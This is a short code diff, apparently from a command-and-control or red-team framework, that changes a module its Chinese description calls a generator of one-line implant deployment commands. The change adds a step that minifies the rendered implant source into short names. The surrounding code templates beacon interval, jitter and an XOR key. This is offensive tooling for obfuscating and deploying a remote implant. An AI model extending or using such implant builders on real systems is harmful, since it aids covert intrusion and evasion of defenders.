@@ -7,6 +7,7 @@ import json
 import os
 
 from server.core.bootstrap import deploy_command
+from server.implant.names import minify
 
 MODULE = {
     "desc": "生成 implant 单行部署命令",
@@ -84,6 +85,7 @@ def run(host, port, key_hex=None, interval=60, jitter=0.2, out_dir=None):
     rendered = rendered.replace("{{INTERVAL}}", str(interval))
     rendered = rendered.replace("{{JITTER}}", str(jitter))
     rendered = rendered.replace("{{XOR_KEY_BYTES}}", str(list(key)))
+    rendered = minify(rendered)  # 可读源码 → 短名产物（D2 契约构建期压缩）
 
     command = deploy_command(rendered)  # 部署壳用随机单字节 k，与通信密钥无关
 
